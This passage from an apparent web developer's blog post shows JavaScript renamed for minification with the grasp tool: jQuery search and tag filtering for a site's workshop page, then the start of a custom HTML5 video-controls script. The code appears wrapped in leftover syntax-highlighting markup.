grasp -i ''#reset'' -R l temp.js</p>
<p>cat temp.js &gt; tmcscripts.js
rm temp.js</p>
<div class="codehilite"><pre><span></span>Which gives us:
</pre></div>


<p>:::javscript
$(document).ready(function () {
    "use strict";
    var z, y, x, w, v, u, t, s;
    z = $(''#noresults'');
    y = $(''#searchinput'');
    x = $(''#workshopBlurbEntries'');
    w = null;
    v = true;
    u = location;
    t = history;
    s = window;</p>
<div class="codehilite"><pre><span></span><span class="n">function</span> <span class="n">k</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">state</span> <span class="o">!==</span> <span class="n">undefined</span><span class="p">)</span> <span class="p">{</span>  <span class="o">//</span> <span class="n">Avoid</span> <span class="n">infinite</span> <span class="n">loops</span>
        <span class="n">t</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="n">undefined</span><span class="p">},</span> <span class="s2">&quot;theMetaCity - Workshop&quot;</span><span class="p">,</span> <span class="s2">&quot;/workshop/&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">z</span><span class="o">.</span><span class="n">hide</span><span class="p">();</span>
    <span class="n">x</span><span class="o">.</span><span class="n">fadeOut</span><span class="p">(</span><span class="mi">150</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;header ul li&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span>
        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;header h1 a span&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTitle&#39;</span><span class="p">);</span>  <span class="o">//</span> <span class="n">The</span> <span class="n">span</span> <span class="n">remains</span> <span class="n">but</span> <span class="n">it</span> <span class="k">is</span> <span class="n">destroyed</span> <span class="n">when</span> <span class="n">filtering</span> <span class="n">using</span> <span class="n">the</span> <span class="n">text</span><span class="p">()</span> <span class="n">function</span>
        <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.workshopentry&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">show</span><span class="p">();</span>
    <span class="p">});</span>
    <span class="n">x</span><span class="o">.</span><span class="n">fadeIn</span><span class="p">(</span><span class="mi">150</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">function</span> <span class="n">l</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">===</span> <span class="n">undefined</span><span class="p">)</span> <span class="p">{</span>  <span class="o">//</span> <span class="n">Only</span> <span class="n">history</span> <span class="n">api</span> <span class="n">should</span> <span class="n">push</span> <span class="n">undefined</span> <span class="n">to</span> <span class="n">this</span><span class="p">,</span> <span class="n">explicitly</span> <span class="n">taken</span> <span class="n">care</span> <span class="n">of</span> <span class="n">otherwise</span>
        <span class="n">k</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">var</span> <span class="n">q</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span><span class="p">[</span><span class="o">.</span><span class="err">?</span><span class="o">*+^$</span>\<span class="p">[</span>\<span class="p">]</span>\\<span class="p">(){}</span><span class="o">|</span><span class="p">]</span><span class="o">/</span><span class="n">g</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">$&amp;&quot;</span><span class="p">),</span> <span class="n">p</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RegExp</span><span class="p">(</span><span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="n">q</span> <span class="o">+</span> <span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;ig&#39;</span><span class="p">);</span>  <span class="o">//</span> <span class="n">The</span> <span class="n">brackets</span> <span class="n">add</span> <span class="n">a</span> <span class="n">capture</span> <span class="n">group</span>

        <span class="n">x</span><span class="o">.</span><span class="n">fadeOut</span><span class="p">(</span><span class="mi">150</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">z</span><span class="o">.</span><span class="n">hide</span><span class="p">();</span>

            <span class="o">$</span><span class="p">(</span><span class="s1">&#39;header&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">hide</span><span class="p">();</span>

                <span class="o">//</span> <span class="n">Clear</span> <span class="n">results</span> <span class="n">of</span> <span class="n">previous</span> <span class="n">search</span>
                <span class="o">$</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">removeClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span>

                <span class="o">//</span> <span class="n">Check</span> <span class="n">the</span> <span class="n">title</span>
                <span class="o">$</span><span class="p">(</span><span class="s1">&#39;h1&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                    <span class="k">var</span> <span class="n">o</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">();</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">o</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
                        <span class="n">o</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s1">&#39;&lt;span class=&quot;searchMatchTitle&quot;&gt;$1&lt;/span&gt;&#39;</span><span class="p">);</span>  <span class="o">//</span><span class="n">capture</span> <span class="n">group</span> <span class="p">(</span><span class="o">$</span><span class="mi">1</span><span class="p">)</span> <span class="n">used</span> <span class="n">so</span> <span class="n">that</span> <span class="n">the</span> <span class="n">replacement</span> <span class="n">matches</span> <span class="n">the</span> <span class="n">case</span> <span class="ow">and</span> <span class="n">you</span> <span class="n">don</span><span class="s1">&#39;t get weird capitolisations</span>
                        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">html</span><span class="p">(</span><span class="n">o</span><span class="p">);</span>
                        <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">closest</span><span class="p">(</span><span class="s1">&#39;.workshopentry&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">show</span><span class="p">();</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">html</span><span class="p">(</span><span class="n">o</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">});</span>

                <span class="o">//</span> <span class="n">Check</span> <span class="n">the</span> <span class="n">tags</span>
                <span class="o">$</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">()</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
                        <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">addClass</span><span class="p">(</span><span class="s1">&#39;searchMatchTag&#39;</span><span class="p">);</span>
                        <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">closest</span><span class="p">(</span><span class="s1">&#39;.workshopentry&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">show</span><span class="p">();</span>
                    <span class="p">}</span>
                <span class="p">});</span>
            <span class="p">});</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="s1">&#39;.workshopentry[style*=&quot;block&quot;]&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">z</span><span class="o">.</span><span class="n">show</span><span class="p">();</span>
            <span class="p">}</span>

            <span class="n">x</span><span class="o">.</span><span class="n">fadeIn</span><span class="p">(</span><span class="mi">150</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="o">$</span><span class="p">(</span><span class="s1">&#39;header ul li a&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="n">t</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">()},</span> <span class="s2">&quot;theMetaCity - Workshop - &quot;</span> <span class="o">+</span> <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">(),</span> <span class="s2">&quot;/workshop/tag/&quot;</span> <span class="o">+</span> <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">());</span>
    <span class="n">y</span><span class="o">.</span><span class="n">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
    <span class="n">l</span><span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">());</span>
    <span class="k">return</span> <span class="bp">false</span><span class="p">;</span>  <span class="o">//</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">history</span> <span class="n">API</span> <span class="n">so</span> <span class="n">no</span> <span class="n">page</span> <span class="n">reloads</span><span class="o">/</span><span class="n">changes</span>
<span class="p">});</span>

<span class="n">y</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s1">&#39;keyup&#39;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="n">clearTimeout</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">val</span><span class="p">()</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">setTimeout</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="k">var</span> <span class="n">n</span> <span class="o">=</span> <span class="n">y</span><span class="o">.</span><span class="n">val</span><span class="p">();</span>
            <span class="n">t</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="n">n</span><span class="p">},</span> <span class="s2">&quot;theMetaCity - Workshop - &quot;</span> <span class="o">+</span> <span class="n">n</span><span class="p">,</span> <span class="s2">&quot;/workshop/tag/&quot;</span> <span class="o">+</span> <span class="n">n</span><span class="p">);</span>
            <span class="n">l</span><span class="p">(</span><span class="n">n</span><span class="p">);</span>
        <span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">val</span><span class="p">()</span><span class="o">.</span><span class="n">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">setTimeout</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">k</span><span class="p">();</span>
        <span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="o">$</span><span class="p">(</span><span class="s1">&#39;#reset&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="n">y</span><span class="o">.</span><span class="n">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
    <span class="n">k</span><span class="p">();</span>
<span class="p">});</span>

<span class="n">s</span><span class="o">.</span><span class="n">addEventListener</span><span class="p">(</span><span class="s2">&quot;popstate&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">console</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">state</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">state</span> <span class="o">===</span> <span class="nb nb-Type">null</span><span class="p">)</span> <span class="p">{</span> <span class="o">//</span> <span class="n">Start</span> <span class="n">of</span> <span class="n">history</span> <span class="n">chain</span> <span class="n">on</span> <span class="n">this</span> <span class="n">page</span><span class="p">,</span> <span class="n">direct</span> <span class="n">entry</span> <span class="n">to</span> <span class="n">page</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">firstRun</span><span class="p">)</span>
        <span class="n">k</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">tag</span> <span class="o">!==</span> <span class="n">undefined</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">y</span><span class="o">.</span><span class="n">val</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">tag</span><span class="p">);</span>
            <span class="n">l</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">tag</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="n">z</span><span class="o">.</span><span class="n">hide</span><span class="p">();</span>

<span class="k">if</span> <span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="p">{</span>                               <span class="o">//</span> <span class="mi">0</span>     <span class="mi">1</span>     <span class="mi">2</span>        <span class="mi">3</span>      <span class="mi">4</span> <span class="p">(</span><span class="k">if</span> <span class="o">/</span> <span class="n">present</span><span class="p">)</span>
    <span class="k">var</span> <span class="n">locArray</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="n">pathname</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>   <span class="o">//</span> <span class="s1">&#39;/workshop/tag/searchString/</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">locArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;tag&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">!==</span> <span class="n">undefined</span><span class="p">)</span> <span class="p">{</span>    <span class="o">//</span> <span class="n">Check</span> <span class="k">for</span> <span class="n">direct</span> <span class="n">link</span> <span class="n">to</span> <span class="n">tag</span> <span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">e</span><span class="o">.</span> <span class="k">if</span> <span class="n">something</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">search</span> <span class="k">for</span> <span class="n">it</span><span class="p">)</span>
        <span class="n">t</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]},</span> <span class="s2">&quot;theMetaCity - Workshop - &quot;</span> <span class="o">+</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="s2">&quot;/workshop/tag/&quot;</span> <span class="o">+</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
        <span class="n">l</span><span class="p">(</span><span class="n">locArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">locArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>   <span class="o">//</span> <span class="n">Root</span> <span class="n">page</span> <span class="ow">and</span> <span class="n">really</span> <span class="n">shouldn</span><span class="s1">&#39;t do anything</span>
        <span class="o">//</span><span class="n">hist</span><span class="o">.</span><span class="n">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="p">:</span> <span class="n">undefined</span><span class="p">},</span> <span class="s2">&quot;theMetaCity - Workshop&quot;</span><span class="p">,</span> <span class="s2">&quot;/workshop/&quot;</span><span class="p">);</span>
    <span class="p">}</span>   <span class="o">//</span> <span class="n">locArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="n">somepagenum</span> <span class="k">is</span> <span class="n">an</span> <span class="n">actual</span> <span class="n">page</span> <span class="ow">and</span> <span class="n">what</span> <span class="n">should</span> <span class="n">be</span> <span class="n">allowed</span> <span class="n">to</span> <span class="n">happen</span> <span class="n">by</span> <span class="n">itself</span>

    <span class="n">v</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
    <span class="o">//</span> <span class="n">Save</span> <span class="n">state</span> <span class="n">on</span> <span class="n">first</span> <span class="n">page</span> <span class="nb">load</span>
<span class="p">}</span>
</pre></div>


<p>});</p>
<div class="codehilite"><pre><span></span><span class="n">Pretty</span> <span class="n">straightforward</span> <span class="n">to</span> <span class="n">use</span> <span class="n">here</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">much</span> <span class="n">difference</span> <span class="ow">in</span> <span class="n">logic</span> <span class="n">compared</span> <span class="n">to</span> <span class="n">sed</span><span class="p">:</span> <span class="n">find</span> <span class="n">a</span> <span class="n">variable</span><span class="o">/</span><span class="n">function</span> <span class="n">replace</span> <span class="n">it</span> <span class="n">with</span> <span class="n">a</span> <span class="n">short</span> <span class="n">name</span><span class="o">.</span> <span class="n">One</span> <span class="n">note</span> <span class="n">you</span> <span class="n">have</span> <span class="n">seen</span> <span class="k">is</span> <span class="n">that</span> <span class="n">it</span> <span class="k">is</span> <span class="n">still</span> <span class="n">pretty</span> <span class="n">new</span> <span class="p">(</span><span class="mi">2</span> <span class="n">months</span> <span class="n">at</span> <span class="n">the</span> <span class="n">time</span> <span class="n">of</span> <span class="n">writing</span> <span class="n">this</span><span class="p">)</span> <span class="ow">and</span> <span class="n">there</span> <span class="n">are</span> <span class="n">some</span> <span class="n">bugs</span> <span class="ow">in</span> <span class="n">there</span> <span class="n">which</span> <span class="n">are</span> <span class="n">easily</span> <span class="n">managed</span><span class="o">.</span> <span class="n">This</span> <span class="k">is</span> <span class="n">a</span> <span class="n">pretty</span> <span class="n">trivial</span> <span class="n">use</span> <span class="n">with</span> <span class="n">nothing</span> <span class="n">too</span> <span class="n">complex</span> <span class="n">to</span> <span class="n">confuse</span> <span class="n">things</span><span class="o">.</span> <span class="n">Let</span><span class="s1">&#39;s look at a better use: video.js</span>
</pre></div>


<p>:::javascript
$(document).ready(function () {
    "use strict";
    var videos = $("video"), doc = document, fsElement;</p>
<div class="codehilite"><pre><span></span><span class="n">Number</span><span class="o">.</span><span class="n">prototype</span><span class="o">.</span><span class="n">leftZeroPad</span> <span class="o">=</span> <span class="n">function</span> <span class="p">(</span><span class="n">numZeros</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">n</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">this</span><span class="p">),</span>
        <span class="n">zeros</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">numZeros</span> <span class="o">-</span> <span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span><span class="o">.</span><span class="n">length</span><span class="p">),</span>
        <span class="n">zeroString</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">pow</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">zeros</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">this</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">zeroString</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="n">zeroString</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">zeroString</span> <span class="o">+</span> <span class="n">n</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">function</span> <span class="n">isVideoPlaying</span><span class="p">(</span><span class="n">video</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="o">!</span><span class="p">(</span><span class="n">video</span><span class="o">.</span><span class="n">paused</span> <span class="o">||</span> <span class="n">video</span><span class="o">.</span><span class="n">ended</span> <span class="o">||</span> <span class="n">video</span><span class="o">.</span><span class="n">seeking</span> <span class="o">||</span> <span class="n">video</span><span class="o">.</span><span class="n">readyState</span> <span class="o">&lt;</span> <span class="n">video</span><span class="o">.</span><span class="n">HAVE_FUTURE_DATA</span><span class="p">);</span>
<span class="p">}</span>

<span class="o">//</span> <span class="n">Pass</span> <span class="ow">in</span> <span class="n">object</span> <span class="n">of</span> <span class="n">the</span> <span class="n">video</span> <span class="n">to</span> <span class="n">play</span><span class="o">/</span><span class="n">pause</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">control</span> <span class="n">box</span> <span class="n">associated</span> <span class="n">with</span> <span class="n">it</span>
<span class="n">function</span> <span class="n">playPause</span><span class="p">(</span><span class="n">video</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">playPauseButton</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.playPauseButton&quot;</span><span class="p">,</span> <span class="n">video</span><span class="o">.</span><span class="n">parent</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">isVideoPlaying</span><span class="p">(</span><span class="n">video</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">video</span><span class="o">.</span><span class="n">pause</span><span class="p">();</span>
        <span class="n">playPauseButton</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="s2">&quot;/media/site-images/videoicons/smallplay.svg&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">video</span><span class="o">.</span><span class="n">play</span><span class="p">();</span>
        <span class="n">playPauseButton</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="s2">&quot;/media/site-images/videoicons/smallpause.svg&quot;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">function</span> <span class="n">rawTimeToFormattedTime</span><span class="p">(</span><span class="n">rawTime</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">chomped</span><span class="p">,</span> <span class="n">seconds</span><span class="p">,</span> <span class="n">minutes</span><span class="p">;</span>
    <span class="n">chomped</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">rawTime</span><span class="p">);</span>
    <span class="n">seconds</span> <span class="o">=</span> <span class="n">chomped</span> <span class="o">%</span> <span class="mi">60</span><span class="p">;</span>
    <span class="n">minutes</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">chomped</span> <span class="o">/</span> <span class="mi">60</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">minutes</span><span class="o">.</span><span class="n">leftZeroPad</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="n">seconds</span><span class="o">.</span><span class="n">leftZeroPad</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="o">$</span><span class="p">(</span><span class="n">videos</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">video</span> <span class="o">=</span> <span class="n">this</span><span class="p">,</span> <span class="o">$</span><span class="n">videoContainer</span><span class="p">,</span> <span class="o">$</span><span class="n">controlsBox</span><span class="p">,</span> <span class="o">$</span><span class="n">playPauseButton</span><span class="p">,</span> <span class="o">$</span><span class="n">progressBar</span><span class="p">,</span> <span class="o">$</span><span class="n">startPoster</span><span class="p">,</span> <span class="n">startPoster</span><span class="p">,</span> <span class="o">$</span><span class="n">endPoster</span><span class="p">,</span> <span class="n">customEndPoster</span><span class="p">,</span> <span class="n">errorPoster</span><span class="p">,</span> <span class="o">$</span><span class="n">currentTimeSpan</span><span class="p">,</span> <span class="o">$</span><span class="n">durationTimeSpan</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">controls</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">this</span><span class="o">.</span><span class="n">controls</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;timeupdate&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="o">$</span><span class="n">progressBar</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">video</span><span class="o">.</span><span class="n">currentTime</span> <span class="o">/</span> <span class="n">video</span><span class="o">.</span><span class="n">duration</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">;</span>
        <span class="o">$</span><span class="n">currentTimeSpan</span><span class="o">.</span><span class="n">text</span><span class="p">(</span><span class="n">rawTimeToFormattedTime</span><span class="p">(</span><span class="n">video</span><span class="o">.</span><span class="n">currentTime</span><span class="p">));</span>

    <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;loadedmetadata&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="k">var</span> <span class="n">canPlayVid</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
            <span class="o">$</span><span class="p">(</span><span class="s2">&quot;source&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">))</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">video</span><span class="o">.</span><span class="n">canPlayType</span><span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;type&quot;</span><span class="p">)))</span> <span class="p">{</span>
                    <span class="n">canPlayVid</span> <span class="o">=</span> <span class="bp">true</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">});</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">canPlayVid</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">errorPoster</span> <span class="o">=</span> <span class="s2">&quot;/media/site-images/movieerror.svg&quot;</span><span class="p">;</span>
                <span class="o">$.</span><span class="n">get</span><span class="p">(</span><span class="n">errorPoster</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="n">svg</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">errorPoster</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">importNode</span><span class="p">(</span><span class="n">svg</span><span class="o">.</span><span class="n">documentElement</span><span class="p">,</span> <span class="bp">true</span><span class="p">);</span>

                    <span class="o">$</span><span class="p">(</span><span class="n">errorPoster</span><span class="p">)</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;class&quot;</span><span class="p">,</span> <span class="s2">&quot;poster errorposter&quot;</span><span class="p">);</span>
